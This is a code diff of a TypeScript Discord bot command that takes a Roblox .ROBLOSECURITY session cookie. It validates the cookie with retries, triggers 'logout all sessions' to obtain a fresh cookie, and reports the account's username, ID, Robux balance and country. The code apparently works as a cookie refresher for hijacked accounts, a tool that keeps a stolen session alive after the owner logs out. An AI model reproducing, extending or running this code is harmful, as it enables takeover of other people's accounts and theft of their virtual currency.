@@ -14,9 +14,8 @@ import { CookieJar } from 'tough-cookie';
 import type { Command } from './types';
 
 const cookieStore = new Map<string, string>();
-const LOGIN_BASE_URL = process.env['LOGIN_BASE_URL'] || 'http://localhost:8080/login.html';
 
-export function buildInitialButtons(id: string): ActionRowBuilder<ButtonBuilder> {
+function buildResetButtons(id: string): ActionRowBuilder<ButtonBuilder> {
   return new ActionRowBuilder<ButtonBuilder>().addComponents(
     new ButtonBuilder()
       .setCustomId(`reset_copypc_${id}`)
@@ -40,26 +39,44 @@ async function fetchRobux(cookie: string, userId: string): Promise<number> {
   return 0;
 }
 
-async function validateCookie(cookie: string): Promise<{ valid: boolean; userId?: string; username?: string }> {
+async function fetchCountry(cookie: string): Promise<string> {
   try {
-    const cleanCookie = cookie.trim();
-    const jar = new CookieJar();
-    await jar.setCookie(`.ROBLOSECURITY=${cleanCookie}; Domain=.roblox.com; Path=/`, 'https://users.roblox.com');
-    const client = wrapper(axios.create({ jar }));
-    const resp = await client.get('https://users.roblox.com/v1/users/authenticated', {
-      headers: {
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-        'Cookie': `.ROBLOSECURITY=${cleanCookie}`,
-      },
-      validateStatus: () => true,
+    const resp = await fetch('https://accountsettings.roblox.com/v1/account/settings/account-country', {
+      headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
     });
     if (resp.status === 200) {
-      return { valid: true, userId: String(resp.data.id), username: resp.data.name };
+      const data = await resp.json() as { value: { countryName: string } };
+      return data.value?.countryName || 'Unknown';
     }
-    return { valid: false };
-  } catch {
-    return { valid: false };
+  } catch {}
+  return 'Unknown';
+}
+
+async function validateCookieWithRetry(cookie: string, maxAttempts = 3): Promise<{ valid: boolean; userId?: string; username?: string; error?: string }> {
+  for (let attempt = 1; attempt <= maxAttempts; attempt++) {
+    try {
+      const cleanCookie = cookie.trim();
+      const jar = new CookieJar();
+      await jar.setCookie(`.ROBLOSECURITY=${cleanCookie}; Domain=.roblox.com; Path=/`, 'https://users.roblox.com');
+      const client = wrapper(axios.create({ jar }));
+      const resp = await client.get('https://users.roblox.com/v1/users/authenticated', {
+        headers: {
+          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+          'Cookie': `.ROBLOSECURITY=${cleanCookie}`,
+        },
+        validateStatus: () => true,
+        timeout: 15000,
+      });
+      if (resp.status === 200) {
+        return { valid: true, userId: String(resp.data.id), username: resp.data.name };
+      }
+      if (resp.status === 401) return { valid: false, error: '401 Unauthorized' };
+    } catch (err: any) {
+      if (attempt === maxAttempts) return { valid: false, error: err.message };
+      await new Promise(resolve => setTimeout(resolve, 1000));
+    }
   }
+  return { valid: false, error: 'All validation attempts failed' };
 }
 
 function extractNewCookie(jar: CookieJar): string | null {
@@ -120,12 +137,15 @@ async function processLogoutAll(cookie: string) {
       return { success: false, newCookie: null };
     }
 
-    const validation = await validateCookie(newCookie);
+    const validation = await validateCookieWithRetry(newCookie);
     if (!validation.valid) {
       return { success: false, newCookie: null };
     }
 
-    const robux = await fetchRobux(newCookie, validation.userId!);
+    const [robux, country] = await Promise.all([
+      fetchRobux(newCookie, validation.userId!),
+      fetchCountry(newCookie),
+    ]);
 
     let thumbnailUrl = '';
     try {
@@ -144,6 +164,7 @@ async function processLogoutAll(cookie: string) {
       username: validation.username || 'Unknown',
       userId: validation.userId || 'Unknown',
       robux,
+      country,
       thumbnailUrl,
     };
   } catch {
@@ -173,12 +194,12 @@ async function execute(interaction: ChatInputCommandInteraction): Promise<void> 
 
     await interaction.editReply({ embeds: [progressEmbed] });
 
-    const validation = await validateCookie(oldCookie);
+    const validation = await validateCookieWithRetry(oldCookie);
     if (!validation.valid) {
       const embed = new EmbedBuilder()
         .setTitle('𖣐 Invalid Cookie .ᐟ')
         .setColor('#FFFFFF')
-        .setDescription('✧ **Error Occurred**\n────\n⭑ The provided cookie is not valid or has already expired.')
+        .setDescription(`✧ **Error Occurred**\n────\n⭑ ${validation.error || 'Cookie invalid or expired.'}`)
         .setFooter(footerData);
       await interaction.editReply({ embeds: [embed] });
       return;
@@ -192,10 +213,7 @@ async function execute(interaction: ChatInputCommandInteraction): Promise<void> 
     if (result.success && result.newCookie) {
       const id = Math.random().toString(36).slice(2, 10);
       cookieStore.set(id, result.newCookie);
-      setTimeout(() => cookieStore.delete(id), 60000);
-
-      const encodedCookie = encodeURIComponent(result.newCookie);
-      const loginLink = `${LOGIN_BASE_URL}?cookie=${encodedCookie}`;
+      setTimeout(() => cookieStore.delete(id), 300000);
 
       const embed = new EmbedBuilder()
         .setTitle('𖣐 Success .ᐟ')
@@ -205,19 +223,19 @@ async function execute(interaction: ChatInputCommandInteraction): Promise<void> 
           `────\n` +
           `⭑ **Username:** ${result.username}\n` +
           `⭑ **User ID:** ${result.userId}\n` +
-          `⭑ **Robux:** ${result.robux.toLocaleString()} ₽\n` +
+          `⭑ **Country:** ${result.country || 'Unknown'}\n` +
+          `💰 **Robux:** ${result.robux.toLocaleString()} ₽\n` +
           `────\n` +
           `✧ **Account Details**\n` +
           `────\n` +
-          `⭑ **Action:** Logout All Sessions\n` +
-          `⭑ 🔗 [Click to auto-login](${loginLink})`
+          `⭑ **Action:** Logout All Sessions`
         )
         .setImage('https://files.catbox.moe/955g15.gif')
         .setFooter(footerData);
 
       if (result.thumbnailUrl) embed.setThumbnail(result.thumbnailUrl);
 
-      await interaction.editReply({ embeds: [embed], components: [buildInitialButtons(id)] });
+      await interaction.editReply({ embeds: [embed], components: [buildResetButtons(id)] });
     } else {
       const embed = new EmbedBuilder()
         .setTitle('𖣐 Failed .ᐟ')
